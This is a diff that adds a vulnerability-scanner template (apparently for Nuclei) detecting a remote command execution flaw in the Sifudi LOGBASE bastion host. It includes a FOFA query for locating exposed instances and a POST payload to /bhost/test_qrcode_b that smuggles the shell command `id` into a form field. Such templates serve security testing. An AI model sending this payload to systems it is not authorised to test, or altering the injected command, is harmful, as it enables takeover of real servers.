@@ -1,0 +1,34 @@
+id: logbase-test-qrcide-b-rce
+
+info:
+  name: 思福迪 运维安全管理系统 test_qrcode_b 远程命令执行漏洞
+  author: fgz
+  severity: critical
+  description: '思福迪运维安全管理系统是思福迪开发的一款运维安全管理堡垒机。思福迪运维安全管理系统 test_qrcode_b 路由存在命令执行漏洞，可以导致服务器被攻击者远控。'
+  tags: Self-Logbase Log Management Integrated Audit System
+  metadata:
+    max-request: 3
+    fofa-query: app="思福迪-LOGBASE"
+    verified: true
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/bhost/test_qrcode_b"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Connection: close
+      Referer: "{{BaseURL}}"
+      Accept-Encoding: gzip
+    body: 'z1=1&z2="|id;"&z3=bhost'
+    unsafe: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"
+
+      - type: status
+        status:
+          - 200
